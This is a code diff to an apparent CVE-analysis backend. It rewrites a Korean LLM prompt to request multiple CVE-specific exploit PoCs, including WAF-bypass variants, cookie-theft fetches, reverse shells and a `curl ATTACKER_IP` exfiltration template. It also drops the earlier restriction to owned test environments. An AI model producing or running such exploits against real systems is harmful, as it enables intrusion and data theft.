@@ -82,53 +82,61 @@ _USER_TEMPLATE = (
     "  (3) 실제 트리거 경로 — 어떤 엔드포인트·파라미터·파일 형식·함수 호출이 어떤 내부 로직의 어떤 결함을 건드리는지\n"
     "  (4) 성공 시 영향 — 획득 권한과 후속 피벗 가능성\n"
     "  '악성 페이로드 전송', '취약점을 악용하여' 같은 추상적 표현 금지. 취약한 코드 경로가 무엇을 잘못 처리하는지까지 설명.\n\n"
-    "payload_example (문자열, 본인 소유 테스트 환경에서 즉시 결과를 확인할 수 있는 실전 PoC):\n"
-    "  중요: 범용·교과서 예시 금지. 이 CVE에만 해당하는 구체적 exploit을 작성하세요.\n"
+    "payload_examples (문자열 배열, 2~5개 항목 — 같은 CVE 의 서로 다른 변형/우회/체인):\n"
+    "  중요: 범용·교과서 예시 금지. 이 CVE 에만 해당하는 구체적 exploit 만 작성.\n"
+    "  각 항목은 독립적으로 실행/검증 가능한 PoC 한 덩어리입니다 — 여러 단계 시나리오라면\n"
+    "  각 단계를 별도 페이로드로 쪼개지 말고 한 항목 안에 줄바꿈으로 묶으세요.\n"
+    "  여러 항목이 의미를 갖는 경우 (모두 작성하지는 말고 해당하는 것만):\n"
+    "    - 기본 페이로드 + WAF/필터 우회 변형 (인코딩·대소문자·중첩·null byte 등)\n"
+    "    - 다른 진입점 (파라미터/헤더/POST body/path)\n"
+    "    - blind 변형 (응답 본문 echo 가 없을 때 time/canary/외부 fetch 활용)\n"
+    "    - exfil 단계까지 이어지는 체인 (XSS → 쿠키 탈취 fetch, SQLi → UNION 으로 hash 추출 등)\n"
     "  반드시 지킬 것:\n"
-    "    1) CVE 설명·제목에 등장한 취약 컴포넌트의 실제 엔드포인트·파라미터·함수명·파일 경로·헤더명을 그대로 사용. 일반화하지 말 것.\n"
-    "    2) 단순 존재 증명(alert(1), 그냥 ' OR 1=1-- 같은 1줄 PoC)이 아니라, 취약 컴포넌트의 기본 필터·처리 로직을 실제로 뚫는 형태.\n"
+    "    1) CVE 설명·제목에 등장한 실제 엔드포인트·파라미터·함수명·파일 경로·헤더명을 그대로 사용\n"
+    "    2) 단순 존재 증명(alert(1), 그냥 ' OR 1=1-- 같은 1줄 PoC) 금지 — 기본 필터·처리 로직을 실제로 뚫는 형태\n"
     "    3) 실제 영향을 회수하는 메커니즘 포함:\n"
-    "       - XSS → document.cookie·localStorage·CSRF 토큰을 ATTACKER_IP로 fetch/이미지 비콘 전송\n"
-    "       - SQLi → UNION 또는 boolean/time-based 기반으로 DB 버전·사용자·해시를 뽑아내는 구체 쿼리\n"
-    "       - 명령 인젝션 → `curl http://ATTACKER_IP/?d=$(명령 | base64)` 형태로 결과 외부 회수 또는 리버스 셸\n"
-    "       - 경로 순회 → /etc/shadow, /proc/self/environ, 애플리케이션 설정·시크릿 등 구체적 민감 파일까지\n"
+    "       - XSS → document.cookie·localStorage·CSRF 토큰을 ATTACKER_IP 로 fetch/이미지 비콘 전송\n"
+    "       - SQLi → UNION 또는 boolean/time-based 기반 DB 버전·사용자·해시 추출 쿼리\n"
+    "       - 명령 인젝션 → `curl http://ATTACKER_IP/?d=$(명령 | base64)` 또는 리버스 셸\n"
+    "       - 경로 순회 → /etc/shadow, /proc/self/environ, 시크릿 등 구체적 민감 파일까지\n"
     "       - SSRF → 클라우드 메타데이터(AWS 169.254.169.254, GCP metadata.google.internal) 또는 내부 관리 엔드포인트\n"
     "       - 역직렬화/템플릿 인젝션 → 실제로 원격 명령까지 이어지는 gadget chain 또는 템플릿 payload\n"
-    "       - 인증 없이 HTTP로 트리거되는 RCE → curl 또는 HTTP 원문 한 세트로 명령 실행 + 결과 회수까지\n"
-    "    4) payload 내에 '# 핵심: ...' 주석으로 '이 토큰·이 인코딩·이 헤더가 어떤 필터/검사를 왜 우회하는지' 최소 1회 지적.\n"
-    "  취약점 유형별 payload 본체 형식:\n"
+    "       - 인증 없이 HTTP 트리거 RCE → curl 또는 HTTP 원문 한 세트로 명령 실행 + 결과 회수까지\n"
+    "    4) payload 내 '# 핵심: ...' 주석으로 '이 토큰·인코딩·헤더가 어떤 필터/검사를 왜 우회하는지' 최소 1회 지적\n"
+    "  유형별 본체 형식:\n"
     "    - XSS/HTML 인젝션 → 주입될 HTML/JS 본체만 (curl 래퍼 금지)\n"
     "    - SQL 인젝션·명령 인젝션·경로 순회·템플릿 인젝션 → 주입되는 문자열만\n"
     "    - SSRF → URL 한 줄\n"
-    "    - HTTP로 직접 트리거되는 RCE/인증우회 → curl 또는 HTTP 원문, 여러 줄로\n"
+    "    - HTTP 트리거 RCE/인증우회 → curl 또는 HTTP 원문, 여러 줄\n"
     "    - 메모리 손상/바이너리 → 최소한의 python PoC\n"
-    "  주석 규칙:\n"
-    "    - 주석이 허용되는 형식이면 첫 줄 '# 용도: ...', 마지막 줄 '# 확인 포인트: ...'를 별도 줄로 추가.\n"
-    "    - 주석을 지원하지 않는 순수 문자열 형태라면 페이로드 본체만 작성.\n"
-    "    - '# 확인 포인트'에는 외부 수신 로그 내용, 응답에 포함될 구체적 문자열/코드, 소요 시간 등 성공 판별 기준을 적습니다.\n"
-    "  여러 줄 페이로드는 JSON 문자열 내 실제 개행(\\n)으로 구분하고, 한 줄로 압축하지 마세요.\n"
-    "  ATTACKER_IP, TARGET_HOST, SESSION_COOKIE 같은 대문자 플레이스홀더만 사용 (실제 IP·도메인 하드코딩 금지). "
-    "본인이 소유·운영하는 테스트 환경 또는 의도적으로 취약하게 구성된 실습 환경에서 사용하는 것을 전제로 작성합니다.\n\n"
-    "mitigation (문자열 배열, 3~6개 항목, 우선순위 높은 순):\n"
-    "  매우 중요: 각 항목은 위에서 작성한 payload_example 자체가 어떻게 실패하게 되는지를 설명해야 합니다. "
-    "  '이 페이로드의 OO 부분이 OO 검사에 걸려 차단됨'처럼 payload의 구체적 요소를 인용하세요.\n"
-    "  각 항목 형식: '[분류] 적용 위치·방법 — 이 패치가 적용됐을 때 위 payload의 어느 부분이 왜 실패하는지'\n"
-    "  분류는 다음 중 선택: 코드패치 / 설정변경 / 입력검증 / WAF·네트워크 / 버전업그레이드\n"
-    "  - 코드패치: 가능한 경우 수정 전/후 코드 스니펫(짧게)이나 함수명·파일 위치 수준의 구체성\n"
-    "  - 입력검증: 어떤 정규식·화이트리스트·정규화 처리가 payload의 어느 토큰을 거르는지\n"
-    "  - WAF·네트워크: payload의 어떤 문자열을 매칭해서 차단하는지(ModSecurity 규칙 예시 등)\n"
-    "  - 버전업그레이드: 수정 버전 번호와, 그 버전에서 payload의 트리거 경로가 어떻게 변경됐는지\n"
-    "  payload와 무관한 일반 조언(로그 모니터링, 최소 권한 등)은 포함하지 마세요."
+    "  주석 규칙: 첫 줄 '# 용도: ...', 마지막 줄 '# 확인 포인트: ...' (외부 수신 로그/응답 문자열/소요 시간 등 성공 판별 기준).\n"
+    "  순수 문자열 형태 (SQL/path/URL 등 단일 line) 는 페이로드 본체만 작성.\n"
+    "  여러 줄은 JSON 문자열 내 실제 개행(\\n) 으로 구분, 한 줄로 압축 금지.\n"
+    "  ATTACKER_IP, TARGET_HOST, SESSION_COOKIE 같은 대문자 플레이스홀더만 사용 (실제 IP·도메인 하드코딩 금지).\n\n"
+    "mitigations (문자열 배열, 3~6개 항목, 우선순위 높은 순) — 위 페이로드를 막는 *패치 항목*:\n"
+    "  매우 중요: 각 항목은 위 payload_examples 가 어떻게 실패하는지 *구체적으로* 설명해야 합니다 ('이 페이로드의 OO 부분이 OO 검사에 걸려 차단됨' 식).\n"
+    "  형식: '[분류] 적용 위치·방법 — 이 패치 적용 시 위 payload 의 어느 부분이 왜 실패하는지'\n"
+    "  분류: 코드패치 / 설정변경 / 입력검증 / WAF·네트워크 / 버전업그레이드\n"
+    "  - 코드패치: 수정 전/후 코드 스니펫 또는 함수명·파일 위치 수준의 구체성\n"
+    "  - 설정변경: 어떤 설정 키를 어떤 값으로 (`feature.xxx=true` 같이 명시적)\n"
+    "  - 입력검증: 어떤 정규식·화이트리스트·정규화가 payload 의 어느 토큰을 거르는지\n"
+    "  - WAF·네트워크: ModSecurity 규칙 (`SecRule ARGS \"@rx ...\"`) 또는 nginx/HAProxy 룰 예시. payload 의 어느 문자열을 매칭하는지 명시\n"
+    "  - 버전업그레이드: 수정 버전 번호 + 그 버전에서 payload 의 트리거 경로가 어떻게 변경됐는지\n"
+    "  payload 와 무관한 일반 조언 (로그 모니터링, 최소 권한 등) 금지."
 )
 
 _JSON_SCHEMA = {
     "type": "object",
     "additionalProperties": False,
-    "required": ["attack_method", "payload_example", "mitigation"],
+    "required": ["attack_method", "payload_examples", "mitigations"],
     "properties": {
         "attack_method": {"type": "string"},
-        "payload_example": {"type": "string"},
-        "mitigation": {
+        "payload_examples": {
+            "type": "array",
+            "items": {"type": "string"},
+            "minItems": 1,
+        },
+        "mitigations": {
             "type": "array",
             "items": {"type": "string"},
             "minItems": 1,
@@ -164,8 +172,8 @@ def _build_response_format(provider: str) -> dict:
 @dataclass
 class AiAnalysis:
     attack_method: str
-    payload_example: str
-    mitigation: list[str]
+    payload_examples: list[str]   # 다중 PoC — 사용자 요청 (PR 10-R)
+    mitigations: list[str]        # 패치 항목 (이전엔 mitigation, 단수)
 
 
 class AiAnalyzerNotConfigured(HTTPException):
@@ -256,13 +264,28 @@ def _parse_payload(raw: str) -> AiAnalysis:
     if not isinstance(data, dict):
         raise HTTPException(status_code=502, detail="AI 응답이 JSON 객체가 아닙니다.")
     try:
-        mitigation = data["mitigation"]
-        if not isinstance(mitigation, list):
-            raise ValueError("mitigation must be a list")
+        # Accept both new (payload_examples / mitigations 복수형) and the
+        # legacy single-payload shape so cached responses + older AI
+        # outputs don't break the panel during the migration window.
+        if "payload_examples" in data:
+            payloads_raw = data["payload_examples"]
+            if not isinstance(payloads_raw, list):
+                raise ValueError("payload_examples must be a list")
+            payload_examples = [str(p).strip() for p in payloads_raw if str(p).strip()]
+        elif "payload_example" in data:
+            payload_examples = [str(data["payload_example"]).strip()]
+        else:
+            raise KeyError("payload_examples")
+
+        mit_raw = data.get("mitigations") or data.get("mitigation")
+        if not isinstance(mit_raw, list):
+            raise ValueError("mitigations must be a list")
+        mitigations = [str(m).strip() for m in mit_raw if str(m).strip()]
+
         return AiAnalysis(
             attack_method=str(data["attack_method"]).strip(),
-            payload_example=str(data["payload_example"]).strip(),
-            mitigation=[str(m).strip() for m in mitigation if str(m).strip()],
+            payload_examples=payload_examples,
+            mitigations=mitigations,
         )
     except (KeyError, ValueError, TypeError) as e:
         raise HTTPException(status_code=502, detail=f"AI 응답 스키마 불일치: {e}") from e
